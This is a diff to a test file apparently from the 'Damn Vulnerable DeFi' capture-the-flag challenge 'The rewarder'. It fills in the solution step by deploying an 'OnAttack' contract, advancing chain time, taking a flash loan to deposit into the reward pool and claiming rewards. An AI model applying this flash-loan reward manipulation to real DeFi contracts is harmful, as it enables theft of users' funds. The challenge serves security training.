@@ -12,12 +12,12 @@ describe('[Challenge] The rewarder', function () {
         [deployer, alice, bob, charlie, david, player] = await ethers.getSigners();
         users = [alice, bob, charlie, david];
 
+        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
         const FlashLoanerPoolFactory = await ethers.getContractFactory('FlashLoanerPool', deployer);
         const TheRewarderPoolFactory = await ethers.getContractFactory('TheRewarderPool', deployer);
-        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
         const RewardTokenFactory = await ethers.getContractFactory('RewardToken', deployer);
         const AccountingTokenFactory = await ethers.getContractFactory('AccountingToken', deployer);
-
+        
         liquidityToken = await DamnValuableTokenFactory.deploy();
         flashLoanPool = await FlashLoanerPoolFactory.deploy(liquidityToken.address);
 
@@ -70,6 +70,25 @@ describe('[Challenge] The rewarder', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        rewardTokenBalance = await rewardToken.balanceOf(player.address);
+        expect(rewardTokenBalance).to.be.eq(0);
+        // deploy atack contract
+        const OnAttackContract = await ethers.getContractFactory('OnAttack', player);
+        OnAttack = await OnAttackContract.deploy(
+            liquidityToken.address,
+            rewardToken.address,
+            flashLoanPool.address,
+            rewarderPool.address
+        );
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
+
+        // loan and attack
+        await OnAttack.getLoanAndDeposit();
+
+        // GetRewards
+        await OnAttack.getRewards();
+        rewardTokenBalance = await rewardToken.balanceOf(player.address);
+        expect(rewardTokenBalance).to.be.eq('99960015993602558976');
     });
 
     after(async function () {
